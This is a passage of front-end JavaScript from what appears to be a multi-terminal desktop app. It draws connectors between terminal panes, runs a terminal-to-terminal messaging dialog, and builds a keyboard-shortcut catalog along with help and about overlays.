  action.hidden = true;
  delete action.dataset.routeId;
  delete action.dataset.sourceId;
  delete action.dataset.targetId;
}

function scheduleTerminalConnectorActionHide() {
  clearTerminalConnectorActionTimer();
  state.terminalConnections.actionHideTimer = window.setTimeout(hideTerminalConnectorAction, 160);
}

function showTerminalConnectorAction(hitPath) {
  const action = elements.terminalConnectorAction;
  if (!action || !hitPath) return;
  const sourceId = hitPath.dataset.sourceId;
  const targetId = hitPath.dataset.targetId;
  if (state.terminals.get(sourceId)?.status !== "live" || state.terminals.get(targetId)?.status !== "live") return;
  clearTerminalConnectorActionTimer();
  action.dataset.routeId = hitPath.dataset.routeId;
  action.dataset.sourceId = sourceId;
  action.dataset.targetId = targetId;
  elements.terminalConnectorLabel.textContent = `${routeTerminalTitle(sourceId)} \u2192 ${routeTerminalTitle(targetId)}`;
  action.hidden = false;
  positionTerminalConnectorAction({
    midX: Number(hitPath.dataset.midX),
    midY: Number(hitPath.dataset.midY)
  });
}

function openTerminalMessagesForConnector() {
  const action = elements.terminalConnectorAction;
  const sourceId = action?.dataset.sourceId;
  const targetId = action?.dataset.targetId;
  if (!sourceId || !targetId) return;
  hideTerminalConnectorAction();
  openTerminalMessages(sourceId, targetId);
  elements.messageText.focus();
}

function renderWorkspaceTerminalConnections() {
  const overlay = elements.terminalConnectionsOverlay;
  const pathGroup = elements.terminalConnectionPaths;
  if (!overlay || !pathGroup || !elements.stage) return;
  pathGroup.textContent = "";
  const stageRect = elements.stage.getBoundingClientRect();
  overlay.setAttribute("viewBox", `0 0 ${Math.max(1, stageRect.width)} ${Math.max(1, stageRect.height)}`);
  const activeRouteId = elements.terminalConnectorAction?.hidden
    ? ""
    : elements.terminalConnectorAction.dataset.routeId;
  let activeRouteRendered = false;
  let rendered = 0;

  for (const route of routesWithOffsets(terminalConnectionRoutes())) {
    const source = state.terminals.get(route.sourceId);
    const target = state.terminals.get(route.targetId);
    if (!source?.pane || !target?.pane || source.pane.offsetParent === null || target.pane.offsetParent === null) continue;
    const sourceAnchor = terminalHandoffGrip(source, "output") || source.pane;
    const targetAnchor = terminalHandoffGrip(target, "input") || target.pane;
    const geometry = connectorPathGeometry(
      sourceAnchor.getBoundingClientRect(),
      targetAnchor.getBoundingClientRect(),
      stageRect,
      route.offset,
      0
    );
    const path = createConnectionSvgElement("path", {
      class: `terminal-connector-path is-${route.type}`,
      d: geometry.d,
      "data-connector-type": route.type,
      "data-source-id": route.sourceId,
      "data-target-id": route.targetId
    });
    pathGroup.append(path);
    const routeId = terminalConnectionRouteId(route);
    pathGroup.append(createConnectionSvgElement("path", {
      class: "terminal-connector-hit",
      d: geometry.d,
      "data-mid-x": geometry.midX,
      "data-mid-y": geometry.midY,
      "data-route-id": routeId,
      "data-source-id": route.sourceId,
      "data-target-id": route.targetId,
      role: "button",
      tabindex: 0,
      "aria-label": `Show message action from ${routeTerminalTitle(route.sourceId, route.sourceTitle)} to ${routeTerminalTitle(route.targetId, route.targetTitle)}`
    }));
    if (routeId === activeRouteId) {
      activeRouteRendered = true;
      positionTerminalConnectorAction(geometry);
    }
    if (route.type === "pending" && route.count > 1) {
      pathGroup.append(createConnectionSvgElement("text", {
        class: "terminal-connector-count",
        x: geometry.midX,
        y: geometry.midY - 6
      }, String(route.count)));
    }
    rendered += 1;
  }
  if (renderTerminalHandoffPreview(stageRect)) rendered += 1;
  overlay.hidden = rendered === 0;
  if (activeRouteId && !activeRouteRendered) hideTerminalConnectorAction();
}

function renderMessageConnectionMap(routes) {
  const svg = elements.messageConnectionsMap;
  if (!svg) return;
  svg.textContent = "";
  appendDialogConnectorDefinitions(svg);
  const connectedIds = new Set(routes.flatMap((route) => [route.sourceId, route.targetId]));
  const terminals = [...state.terminals.values()]
    .filter((terminal) => connectedIds.has(terminal.id) && terminal.status === "live")
    .slice(0, 12);
  if (routes.length === 0 || terminals.length < 2) {
    svg.hidden = true;
    return;
  }

  const width = 680;
  const columns = Math.min(4, terminals.length);
  const rows = Math.ceil(terminals.length / columns);
  const height = Math.max(120, rows * 70 + 30);
  svg.hidden = false;
  svg.style.height = `${Math.min(260, height)}px`;
  svg.setAttribute("viewBox", `0 0 ${width} ${height}`);
  const positions = new Map();
  const nodeWidth = Math.min(130, width / columns - 24);

  terminals.forEach((terminal, index) => {
    const column = index % columns;
    const row = Math.floor(index / columns);
    const x = (column + 0.5) * (width / columns);
    const y = 35 + row * 70;
    positions.set(terminal.id, {
      bottom: y + 18,
      left: x - nodeWidth / 2,
      right: x + nodeWidth / 2,
      top: y - 18
    });
  });

  for (const route of routesWithOffsets(routes)) {
    const sourceRect = positions.get(route.sourceId);
    const targetRect = positions.get(route.targetId);
    if (!sourceRect || !targetRect) continue;
    const geometry = connectorPathGeometry(sourceRect, targetRect, { left: 0, top: 0 }, route.offset / 2);
    svg.append(createConnectionSvgElement("path", {
      class: `message-map-${route.type}`,
      d: geometry.d,
      "data-map-connector-type": route.type
    }));
    if (route.type === "pending" && route.count > 1) {
      svg.append(createConnectionSvgElement("text", {
        class: "message-map-count",
        x: geometry.midX,
        y: geometry.midY - 5
      }, String(route.count)));
    }
  }

  for (const terminal of terminals) {
    const rect = positions.get(terminal.id);
    const x = (rect.left + rect.right) / 2;
    const y = (rect.top + rect.bottom) / 2;
    const group = createConnectionSvgElement("g", { class: "message-map-node", "data-map-terminal-id": terminal.id });
    group.append(createConnectionSvgElement("rect", {
      x: rect.left,
      y: rect.top,
      width: rect.right - rect.left,
      height: rect.bottom - rect.top,
      rx: 4
    }));
    const title = terminal.titleInput.value || "Terminal";
    group.append(createConnectionSvgElement("text", { x, y: y + 4 }, title.length > 18 ? `${title.slice(0, 17)}\u2026` : title));
    svg.append(group);
  }
}

function renderMessageConnections() {
  if (!elements.messageConnectionsList || !elements.terminalMessagesOverlay.classList.contains("is-open")) return;
  const routes = terminalConnectionRoutes();
  elements.messageConnectionsList.textContent = "";
  elements.messageConnectionsEmpty.hidden = routes.length > 0;
  renderMessageConnectionMap(routes);

  for (const route of routes) {
    const row = document.createElement("div");
    row.className = "message-connection-row";
    const swatch = document.createElement("i");
    swatch.className = `connection-swatch is-${route.type}`;
    const label = document.createElement("span");
    const sourceTitle = routeTerminalTitle(route.sourceId, route.sourceTitle);
    const targetTitle = routeTerminalTitle(route.targetId, route.targetTitle);
    label.textContent = route.type === "pending"
      ? `${sourceTitle} \u2192 ${targetTitle} \u00b7 ${route.count} pending`
      : `${sourceTitle} \u2192 ${targetTitle}`;
    row.append(swatch, label);
    if (route.type === "link") {
      const remove = document.createElement("button");
      remove.type = "button";
      remove.className = "icon-button";
      remove.dataset.terminalUnlink = route.key;
      remove.title = "Remove terminal link";
      remove.setAttribute("aria-label", `Remove link from ${sourceTitle} to ${targetTitle}`);
      const icon = document.createElement("i");
      icon.dataset.lucide = "unlink-2";
      remove.append(icon);
      row.append(remove);
    } else {
      row.append(document.createElement("span"));
    }
    elements.messageConnectionsList.append(row);
  }
  refreshIcons(elements.messageConnectionsList);
}

function scheduleTerminalConnections() {
  if (state.terminalConnections.frame) return;
  state.terminalConnections.frame = window.requestAnimationFrame(() => {
    state.terminalConnections.frame = 0;
    renderWorkspaceTerminalConnections();
  });
}

function trackTerminalConnectionAnimation(duration) {
  if (terminalConnectionRoutes().length === 0) return;
  state.terminalConnections.animationUntil = Math.max(
    state.terminalConnections.animationUntil,
    performance.now() + duration
  );
  if (state.terminalConnections.animationFrame) return;
  const renderFrame = (time) => {
    renderWorkspaceTerminalConnections();
    if (time < state.terminalConnections.animationUntil) {
      state.terminalConnections.animationFrame = window.requestAnimationFrame(renderFrame);
    } else {
      state.terminalConnections.animationFrame = 0;
      scheduleTerminalConnections();
    }
  };
  state.terminalConnections.animationFrame = window.requestAnimationFrame(renderFrame);
}

function updateTerminalConnectionViews() {
  scheduleTerminalConnections();
  renderMessageConnections();
  renderAutomationRoutes();
  updateTerminalHandoffGripStates();
}

function updateMessageLinkAction() {
  if (!elements.messageLinkAdd) return;
  const sourceId = elements.messageSource.value;
  const targetId = elements.messageTarget.value;
  const valid = sourceId && targetId && sourceId !== targetId
    && state.terminals.get(sourceId)?.status === "live"
    && state.terminals.get(targetId)?.status === "live";
  const linked = valid && state.terminalLinks.has(terminalLinkKey(sourceId, targetId));
  elements.messageLinkAdd.disabled = !valid || linked;
  elements.messageLinkAdd.title = linked
    ? "Selected terminals are already linked"
    : valid ? "Link selected terminals" : "Choose two different live terminals to link";
}

function bindTerminalConnectionGeometry() {
  elements.host.addEventListener("scroll", scheduleTerminalConnections, { passive: true });
  state.terminalConnections.resizeObserver = new ResizeObserver(scheduleTerminalConnections);
  state.terminalConnections.resizeObserver.observe(elements.stage);
  state.terminalConnections.resizeObserver.observe(elements.host);
  state.terminalConnections.mutationObserver = new MutationObserver(scheduleTerminalConnections);
  state.terminalConnections.mutationObserver.observe(elements.host, {
    attributes: true,
    attributeFilter: ["class", "style", "data-layout", "data-snap-edge"],
    childList: true,
    subtree: false
  });
  window.addEventListener("storage", (event) => {
    if (event.key !== "multiterm.terminalLinks") return;
    state.terminalLinks = loadTerminalLinks();
    updateTerminalConnectionViews();
  });
  window.addEventListener("resize", scheduleTerminalConnections);
  window.addEventListener("pointermove", (event) => {
    if (!state.terminalConnections.linkSourceId || state.terminalConnections.linkPointerId == null) return;
    if (event.pointerId !== state.terminalConnections.linkPointerId) return;
    const previous = state.terminalConnections.linkPoint;
    if (previous && Math.hypot(event.clientX - previous.x, event.clientY - previous.y) > 3) {
      state.terminalConnections.linkMoved = true;
    }
    state.terminalConnections.linkPoint = { x: event.clientX, y: event.clientY };
    state.terminalConnections.linkTargetId = handoffTargetAtPoint(event.clientX, event.clientY);
    updateTerminalHandoffGripStates();
    scheduleTerminalConnections();
  });
  window.addEventListener("pointerup", (event) => {
    if (!state.terminalConnections.linkSourceId || state.terminalConnections.linkPointerId == null) return;
    if (event.pointerId !== state.terminalConnections.linkPointerId) return;
    const targetId = handoffTargetAtPoint(event.clientX, event.clientY) || state.terminalConnections.linkTargetId;
    if (targetId) completeTerminalHandoffLink(targetId);
    else if (state.terminalConnections.linkMoved) clearTerminalHandoffLinking();
    else {
      state.terminalConnections.linkPointerId = null;
      state.terminalConnections.linkPoint = null;
      scheduleTerminalConnections();
    }
  });
  window.addEventListener("keydown", (event) => {
    if (event.key === "Escape" && state.terminalConnections.linkSourceId) clearTerminalHandoffLinking();
  });
  scheduleTerminalConnections();
}

function liveMessageTerminals() {
  return [...state.terminals.values()].filter((terminal) => terminal.status === "live");
}

function messageTerminalLabel(terminal) {
  return `${terminal.titleInput.value || "Terminal"} \u00b7 ${terminal.pid ? `PID ${terminal.pid}` : terminal.id}`;
}

function refreshMessageRoutes(preferredSourceId = null, preferredTargetId = null) {
  const terminals = liveMessageTerminals();
  const sourceId = preferredSourceId || elements.messageSource.value || state.activeId;
  const targetId = preferredTargetId || elements.messageTarget.value;
  elements.messageSource.textContent = "";
  elements.messageTarget.textContent = "";

  for (const terminal of terminals) {
    const sourceOption = document.createElement("option");
    sourceOption.value = terminal.id;
    sourceOption.textContent = messageTerminalLabel(terminal);
    elements.messageSource.append(sourceOption);

    const targetOption = document.createElement("option");
    targetOption.value = terminal.id;
    targetOption.textContent = messageTerminalLabel(terminal);
    elements.messageTarget.append(targetOption);
  }

  if (terminals.some((terminal) => terminal.id === sourceId)) elements.messageSource.value = sourceId;
  const availableTargets = terminals.filter((terminal) => terminal.id !== elements.messageSource.value);
  elements.messageTarget.textContent = "";
  for (const terminal of availableTargets) {
    const option = document.createElement("option");
    option.value = terminal.id;
    option.textContent = messageTerminalLabel(terminal);
    elements.messageTarget.append(option);
  }
  if (availableTargets.some((terminal) => terminal.id === targetId)) elements.messageTarget.value = targetId;
  elements.messageSend.disabled = terminals.length < 2;
  elements.messageSend.title = terminals.length < 2 ? "Open at least two live terminals to send a message" : "Send terminal message";
  updateMessageLinkAction();
}

function updateMessageComposerFields() {
  const kind = elements.messageKind.value;
  elements.messagePathRow.hidden = kind !== "path" && kind !== "result";
  elements.messageStatusRow.hidden = kind !== "status";
  elements.messageTextRow.hidden = kind === "path";
  elements.messageText.required = kind !== "path" && kind !== "status";
  elements.messagePath.required = kind === "path";
  elements.messageStatus.required = kind === "status";
}

function setMessageComposerError(message = "") {
  elements.messageComposerError.textContent = message;
  elements.messageComposerError.hidden = !message;
}

function normalizeIncomingTerminalMessage(value) {
  if (!value || typeof value !== "object" || Array.isArray(value)) return null;
  if (typeof value.id !== "string" || !terminalMessaging.MESSAGE_KINDS.includes(value.kind)) return null;
  if (typeof value.sourceId !== "string" || typeof value.targetId !== "string") return null;
  return {
    createdAt: typeof value.createdAt === "string" ? value.createdAt : new Date().toISOString(),
    delivery: value.delivery === "whenReady" ? "whenReady" : "review",
    id: value.id,
    kind: value.kind,
    path: typeof value.path === "string" ? value.path : "",
    persist: Boolean(value.persist),
    sourceId: value.sourceId,
    sourceTitle: typeof value.sourceTitle === "string" ? value.sourceTitle : "Terminal",
    state: "pending",
    status: typeof value.status === "string" ? value.status : "",
    targetId: value.targetId,
    targetTitle: typeof value.targetTitle === "string" ? value.targetTitle : "Terminal",
    text: typeof value.text === "string" ? value.text : ""
  };
}

function ingestTerminalMessage(value, notify = true) {
  const message = normalizeIncomingTerminalMessage(value);
  if (!message) return false;
  const isNew = !state.terminalMessages.has(message.id);
  state.terminalMessages.set(message.id, message);
  updateTerminalMessageIndicators();
  renderTerminalMessages();
  if (message.delivery === "whenReady") scheduleTerminalHandoffDelivery(state.terminals.get(message.targetId), 150);
  if (notify && isNew && state.terminals.has(message.targetId)) {
    toast(`Message context ${message.sourceTitle} to ${message.targetTitle}`, "info", 2800);
  }
  return true;
}

function updateTerminalMessageIndicators() {
  const count = state.terminalMessages.size;
  elements.terminalMessagesBadge.hidden = count === 0;
  elements.terminalMessagesBadge.textContent = count > 99 ? "99+" : String(count);
  const label = count ? `Terminal messages: ${count} pending` : "Terminal messages";
  elements.terminalMessagesToggle.title = label;
  elements.terminalMessagesToggle.setAttribute("aria-label", label);
  updateTerminalConnectionViews();
}

function terminalMessageContent(message) {
  if (message.kind === "path") return message.path;
  if (message.kind === "status") return [message.status, message.text].filter(Boolean).join(": ");
  return [message.text, message.path].filter(Boolean).join("\n");
}

function renderTerminalMessages() {
  if (!elements.terminalMessagesList) return;
  if (!elements.terminalMessagesOverlay.classList.contains("is-open")) return;
  const messages = [...state.terminalMessages.values()]
    .sort((left, right) => String(right.createdAt).localeCompare(String(left.createdAt)));
  elements.terminalMessagesList.textContent = "";
  elements.terminalMessagesEmpty.hidden = messages.length > 0;

  for (const message of messages) {
    const item = document.createElement("article");
    item.className = "terminal-message-item";
    item.dataset.messageId = message.id;

    const copy = document.createElement("div");
    copy.className = "terminal-message-copy";
    const meta = document.createElement("span");
    meta.className = "terminal-message-meta";
    meta.textContent = `Context: ${message.sourceTitle} \u2192 ${message.targetTitle} \u00b7 ${message.kind}${message.delivery === "whenReady" ? " · waiting for ready" : ""} \u00b7 ${artifactTimeLabel(message.createdAt)}`;
    const content = document.createElement("div");
    content.className = `terminal-message-content${message.kind === "path" ? " terminal-message-path" : ""}`;
    content.textContent = terminalMessageContent(message);
    copy.append(meta, content);

    const actions = document.createElement("div");
    actions.className = "terminal-message-actions";
    const insert = document.createElement("button");
    insert.type = "button";
    insert.dataset.messageAction = "insert";
    insert.textContent = message.delivery === "whenReady" ? "Queued" : "Insert";
    insert.title = message.delivery === "whenReady"
      ? "This handoff will be staged when the target is ready"
      : "Insert into the target terminal without pressing Enter";
    insert.disabled = message.delivery === "whenReady" || state.terminals.get(message.targetId)?.status !== "live";
    const dismiss = document.createElement("button");
    dismiss.type = "button";
    dismiss.dataset.messageAction = "dismiss";
    dismiss.textContent = "Dismiss";
    actions.append(insert, dismiss);
    item.append(copy, actions);
    elements.terminalMessagesList.append(item);
  }
}

async function requestTerminalMessages() {
  if (!state.socketReady) return null;
  return requestBridge({ type: "messageList" }, { timeout: 12000 });
}

async function sendComposedTerminalMessage() {
  setMessageComposerError();
  const request = {
    kind: elements.messageKind.value,
    path: elements.messagePath.value,
    persist: false,
    sourceId: elements.messageSource.value,
    status: elements.messageStatus.value,
    targetId: elements.messageTarget.value,
    text: elements.messageText.value
  };
  const normalized = terminalMessaging.normalizeMessageRequest(
    request,
    Number(state.settings.terminalMessageMaxKb) * 1024
  );
  if (!normalized.ok) {
    setMessageComposerError(normalized.error);
    return false;
  }

  const response = await requestBridge({ type: "messageSend", ...normalized.value }, { timeout: 12000 });
  if (!response || response.type === "messageError") {
    setMessageComposerError(response?.message || "The terminal message could not be sent.");
    return false;
  }
  elements.messageText.value = "";
  elements.messagePath.value = "";
  elements.messageStatus.value = "";
  toast("Terminal message sent", "success", 1800);
  return true;
}

async function actOnRenderedTerminalMessage(id, action) {
  const message = state.terminalMessages.get(id);
  if (!message) return false;
  const response = await requestBridge({ type: "messageAction", id, action }, { timeout: 12000 });
  if (!response || response.type === "messageError") {
    toast(response?.message || "The terminal message action failed.", "error", 2600);
    return false;
  }
  state.terminalMessages.delete(id);
  updateTerminalMessageIndicators();
  renderTerminalMessages();
  if (action === "insert") {
    const target = state.terminals.get(message.targetId);
    closeTerminalMessages({ restoreFocus: false });
    if (target) focusTerminalAfterQueueInsert(target, { closeArtifacts: false });
  }
  return true;
}

function openTerminalMessages(sourceId = null, targetId = null) {
  if (!elements.terminalMessagesOverlay) return;
  closePalette();
  hideContextMenu();
  state.terminalMessagesHub.returnFocus = document.activeElement instanceof HTMLElement
    ? document.activeElement
    : null;
  refreshMessageRoutes(sourceId, targetId);
  updateMessageComposerFields();
  setMessageComposerError();
  document.querySelector(".app-shell").inert = true;
  elements.terminalMessagesOverlay.hidden = false;
  window.requestAnimationFrame(() => {
    elements.terminalMessagesOverlay.classList.add("is-open");
    renderTerminalMessages();
    renderMessageConnections();
  });
  requestTerminalMessages();
  elements.messageSource.focus();
}

function closeTerminalMessages({ restoreFocus = true } = {}) {
  if (!elements.terminalMessagesOverlay) return;
  const returnFocus = state.terminalMessagesHub.returnFocus;
  state.terminalMessagesHub.returnFocus = null;
  elements.terminalMessagesOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    if (!elements.terminalMessagesOverlay.classList.contains("is-open")) {
      elements.terminalMessagesOverlay.hidden = true;
      document.querySelector(".app-shell").inert = false;
      if (restoreFocus && returnFocus?.isConnected) returnFocus.focus({ preventScroll: true });
    }
  }, 150);
}

function terminalMessagesFocusableElements() {
  return [...elements.terminalMessagesOverlay.querySelectorAll(
    'a[href], button:not([disabled]), input:not([disabled]), select:not([disabled]), textarea:not([disabled]), [tabindex]:not([tabindex="-1"])'
  )].filter((element) => !element.hidden && element.offsetParent !== null);
}

function bindTerminalMessages() {
  if (!elements.terminalMessagesOverlay) return;
  bindTerminalConnectionGeometry();
  elements.terminalConnectionPaths.addEventListener("pointerover", (event) => {
    const hitPath = event.target.closest?.(".terminal-connector-hit");
    if (hitPath) showTerminalConnectorAction(hitPath);
  });
  elements.terminalConnectionPaths.addEventListener("pointerout", (event) => {
    if (event.target.closest?.(".terminal-connector-hit")) scheduleTerminalConnectorActionHide();
  });
  elements.terminalConnectionPaths.addEventListener("focusin", (event) => {
    const hitPath = event.target.closest?.(".terminal-connector-hit");
    if (hitPath) showTerminalConnectorAction(hitPath);
  });
  elements.terminalConnectionPaths.addEventListener("focusout", (event) => {
    if (event.target.closest?.(".terminal-connector-hit")) scheduleTerminalConnectorActionHide();
  });
  elements.terminalConnectionPaths.addEventListener("click", (event) => {
    const hitPath = event.target.closest?.(".terminal-connector-hit");
    if (!hitPath) return;
    showTerminalConnectorAction(hitPath);
    elements.terminalConnectorSend.focus({ preventScroll: true });
  });
  elements.terminalConnectionPaths.addEventListener("keydown", (event) => {
    const hitPath = event.target.closest?.(".terminal-connector-hit");
    if (!hitPath || (event.key !== "Enter" && event.key !== " ")) return;
    event.preventDefault();
    showTerminalConnectorAction(hitPath);
    elements.terminalConnectorSend.focus({ preventScroll: true });
  });
  elements.terminalConnectorAction.addEventListener("pointerenter", clearTerminalConnectorActionTimer);
  elements.terminalConnectorAction.addEventListener("pointerleave", scheduleTerminalConnectorActionHide);
  elements.terminalConnectorSend.addEventListener("click", openTerminalMessagesForConnector);
  document.addEventListener("pointerdown", (event) => {
    if (event.target.closest?.(".terminal-connector-hit, .terminal-connector-action")) return;
    hideTerminalConnectorAction();
  });
  updateTerminalMessageIndicators();
  elements.terminalMessagesToggle.addEventListener("click", () => openTerminalMessages(state.activeId));
  elements.terminalMessagesClose.addEventListener("click", () => closeTerminalMessages());
  elements.terminalMessagesRefresh.addEventListener("click", requestTerminalMessages);
  elements.terminalMessagesOverlay.addEventListener("pointerdown", (event) => {
    if (event.target === elements.terminalMessagesOverlay) closeTerminalMessages();
  });
  elements.terminalMessagesOverlay.addEventListener("keydown", (event) => {
    if (event.key === "Escape") {
      event.preventDefault();
      event.stopPropagation();
      closeTerminalMessages();
      return;
    }
    if (event.key !== "Tab") return;
    const focusable = terminalMessagesFocusableElements();
    if (focusable.length === 0) return;
    const first = focusable[0];
    const last = focusable[focusable.length - 1];
    if (event.shiftKey && document.activeElement === first) {
      event.preventDefault();
      last.focus();
    } else if (!event.shiftKey && document.activeElement === last) {
      event.preventDefault();
      first.focus();
    }
  });
  elements.messageSource.addEventListener("change", () => refreshMessageRoutes(elements.messageSource.value));
  elements.messageTarget.addEventListener("change", updateMessageLinkAction);
  elements.messageKind.addEventListener("change", updateMessageComposerFields);
  elements.messageLinkAdd.addEventListener("click", addSelectedTerminalLink);
  elements.messageSend.addEventListener("click", sendComposedTerminalMessage);
  elements.messageText.addEventListener("keydown", (event) => {
    if (event.key === "Enter" && event.ctrlKey && !event.isComposing) {
      event.preventDefault();
      sendComposedTerminalMessage();
    }
  });
  elements.terminalMessagesList.addEventListener("click", (event) => {
    const button = event.target.closest("[data-message-action]");
    const item = button?.closest("[data-message-id]");
    if (button && item) actOnRenderedTerminalMessage(item.dataset.messageId, button.dataset.messageAction);
  });
  elements.messageConnectionsList.addEventListener("click", (event) => {
    const button = event.target.closest("[data-terminal-unlink]");
    if (button) removeTerminalLink(button.dataset.terminalUnlink);
  });
}

/* ---------------- Shortcuts cheat sheet --------------- */

const SHORTCUT_SECTIONS = Object.freeze([
  {
    title: "Terminal right-click menu shortcuts",
    items: [
      ["Ctrl+Shift+C", "Copy", "Copies the selected terminal output."],
      ["Ctrl+Shift+V", "Paste", "Pastes clipboard text into the active terminal."],
      ["Ctrl+A", "Select all", "Selects all output in the terminal buffer."],
      ["Ctrl+F", "Find", "Opens search for the active terminal."],
      ["Ctrl+Shift+F", "Find in all terminals", "Searches every terminal buffer."],
      ["Ctrl+Shift+L", "Clear", "Clears the active terminal display."],
      ["Ctrl+Shift+X", "Maximize or restore", "Toggles the active pane between normal and maximized size."],
      ["Ctrl+Shift+R", "Restart", "Restarts the active terminal session."],
      ["Ctrl+Shift+W", "Close", "Closes the active terminal session."]
    ]
  },
  {
    title: "Page right-click menu shortcuts",
    items: [
      ["Ctrl+P", "New page", "Creates and opens a new page."],
      ["Ctrl+T", "New terminal", "Starts a terminal in the current workspace folder."],
      ["Ctrl+Shift+F", "Find in all terminals", "Searches every terminal on every page."],
      ["Ctrl+Shift+B", "Broadcast command", "Opens the command broadcaster."],
      ["Ctrl+Shift+P", "Command palette", "Opens the searchable action palette."]
    ]
  },
  {
    title: "App shortcuts (available at any time)",
    items: [
      ["Ctrl+Shift+P / F1", "Command palette", "Opens or closes the searchable action palette."],
      ["Ctrl+P", "New page", "Creates and opens a new page instead of opening Print."],
      ["Alt+Q", "Switch terminal", "Opens the quick terminal switcher."],
      ["Alt+1…9 / Alt+A…Z", "Jump to terminal", "Chooses a terminal from the quick switcher."],
      ["Ctrl+PageDown / Ctrl+PageUp", "Next or previous page", "Moves between pages without stopping their terminals."],
      ["Alt+1…9", "Go to page", "Opens the page at the matching position."],
      ["Ctrl+/", "Keyboard shortcuts", "Opens or closes this shortcut catalog."],
      ["F11 / Esc", "Fullscreen focus mode", "F11 enters or exits fullscreen with collapsible controls hidden; Esc exits and restores the previous UI."],
      ["Ctrl+T / Ctrl+Shift+T", "New terminal", "Starts a terminal on the active page."],
      ["Ctrl+Shift+W", "Close active terminal", "Closes the active terminal session."],
      ["Ctrl+Shift+R", "Restart active terminal", "Restarts the active shell."],
      ["Ctrl+F / Ctrl+Shift+F", "Find", "Searches the active terminal or every terminal."],
      ["Ctrl+Shift+E", "Search and filter panes", "Focuses the terminal filter in the top bar."],
      ["Ctrl+Shift+L", "Clear active terminal", "Clears the active terminal display."],
      ["Ctrl+Shift+X", "Maximize or restore pane", "Toggles the active pane size."],
      ["Ctrl+V / Ctrl+Shift+V", "Paste", "Pastes clipboard text into the active terminal."],
      ["Ctrl+Shift+C", "Copy output", "Copies selected terminal output."],
      ["Alt+Drag", "Pass drag to full-screen app", "Lets a mouse-aware terminal app handle the drag."],
      ["Ctrl+Shift+Q", "Dequeue next command", "Inserts and runs the next staged command."],
      ["Ctrl+Shift+B", "Broadcast command", "Opens the command broadcaster."],
      ["Ctrl+Alt+→ / Ctrl+Alt+←", "Next or previous terminal", "Cycles terminal focus."],
      ["Ctrl+mouse wheel", "Zoom terminal under pointer", "Changes only the pointed terminal's font size."],
      ["Ctrl+Alt+= / Ctrl+Alt+- / Ctrl+Alt+0", "Active terminal zoom", "Changes or resets only the active terminal's font size."],
      ["Ctrl+= / Ctrl+- / Ctrl+0", "Default terminal zoom", "Changes or resets the default terminal font size."],
      ["Escape", "Close active surface", "Closes the active dialog, menu, or search."]
    ]
  }
]);

const TERMINAL_SHORTCUT_LABELS = Object.freeze({
  "terminal.command-queue": "Command queue",
  "terminal.copy": "Copy",
  "terminal.copy-prepare": "Copy and prepare",
  "terminal.prepare-paste": "Prepare and paste",
  "terminal.copy-all": "Copy all output",
  "terminal.paste": "Paste",
  "terminal.paste-execute": "Paste and execute",
  "terminal.select-all": "Select all",
  "terminal.find": "Find",
  "terminal.find-all": "Find in all terminals",
  "terminal.clear": "Clear",
  "terminal.zoom": "Maximize or restore",
  "terminal.statistics": "Terminal statistics",
  "terminal.notes": "Notes and command queue",
  "terminal.send-message": "Send to terminal",
  "terminal.open-folder": "Open folder",
  "terminal.new-here": "New terminal here",
  "terminal.copilot-yolo": "Run Copilot CLI (YOLO)",
  "terminal.copilot-resume": "Resume Copilot CLI session",
  "terminal.new-admin": "New Administrator terminal",
  "terminal.run-script": "Run script",
  "terminal.logging.toggle": "Toggle logging",
  "terminal.logging.reveal-last": "Reveal last log",
  "terminal.logging.reveal-folder": "Reveal log folder",
  "terminal.duplicate": "Split (duplicate)",
  "terminal.restart": "Restart",
  "terminal.cycle-color": "Cycle color",
  "terminal.move-new-page": "Move to new page",
  "terminal.close": "Close"
});

function terminalShortcutLabel(actionId) {
  if (TERMINAL_SHORTCUT_LABELS[actionId]) return TERMINAL_SHORTCUT_LABELS[actionId];
  if (actionId.startsWith("terminal.move-page:")) {
    return `Move to ${pageName(actionId.slice("terminal.move-page:".length)) || "page"}`;
  }
  if (actionId.startsWith("terminal.snippet:")) {
    const token = actionId.slice("terminal.snippet:".length);
    const snippet = (state.settings.snippets || []).find((item) => (
      stableContextActionToken(`${item.name || ""}\n${item.command || ""}`) === token
    ));
    return snippet?.name || snippet?.command || "Run saved snippet";
  }
  return actionId;
}

function renderShortcutSection(title, items) {
  const section = document.createElement("section");
  section.className = "shortcuts-section";
  const heading = document.createElement("h3");
  heading.textContent = title;
  const list = document.createElement("ul");
  list.className = "shortcuts-list";
  for (const [shortcut, label, detail] of items) {
    const row = document.createElement("li");
    const description = document.createElement("span");
    description.className = "shortcut-description";
    const name = document.createElement("strong");
    name.textContent = label;
    const explanation = document.createElement("small");
    explanation.textContent = detail;
    const key = document.createElement("span");
    key.className = "kbd";
    key.textContent = shortcut;
    description.append(name, explanation);
    row.append(description, key);
    list.append(row);
  }
  section.append(heading, list);
  elements.shortcutsCatalog.append(section);
}

function renderShortcutCatalog() {
  elements.shortcutsCatalog.textContent = "";
  for (const section of SHORTCUT_SECTIONS) renderShortcutSection(section.title, section.items);
  const custom = [...contextMenuShortcuts.entries()].map(([actionId, binding]) => [
    formatContextShortcut(binding),
    terminalShortcutLabel(actionId),
    "Runs this customized action while a terminal context menu is open."
  ]);
  if (custom.length > 0) renderShortcutSection("Custom terminal right-click shortcuts", custom);
}

function openShortcuts() {
  closePalette();
  renderShortcutCatalog();
  elements.shortcutsOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.shortcutsOverlay.classList.add("is-open"));
  refreshIcons();
}

function closeShortcuts() {
  elements.shortcutsOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.shortcutsOverlay.hidden = true;
  }, 150);
}

/* ---------------- Help --------------- */

function openHelp() {
  closePalette();
  const resolved = document.documentElement.dataset.appTheme === "light" ? "light" : "dark";
  const wanted = `help.html?theme=${resolved}`;
  // Load (or reload with the current theme) only when needed.
  if (elements.helpFrame.dataset.src !== wanted) {
    elements.helpFrame.dataset.src = wanted;
    elements.helpFrame.src = wanted;
  }
  elements.helpOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.helpOverlay.classList.add("is-open"));
  refreshIcons();
}

function closeHelp() {
  elements.helpOverlay.classList.remove("is-open");
  window.setTimeout(() => {
    elements.helpOverlay.hidden = true;
  }, 150);
}

/* ---------------- About --------------- */

function applyVersion() {
  if (elements.aboutVersion) elements.aboutVersion.textContent = `v${APP_VERSION}`;
  if (elements.aboutVersionText) elements.aboutVersionText.textContent = APP_VERSION;
}

function openAbout() {
  closePalette();
  elements.aboutOverlay.hidden = false;
  window.requestAnimationFrame(() => elements.aboutOverlay.classList.add("is-open"));
  refreshIcons();
}

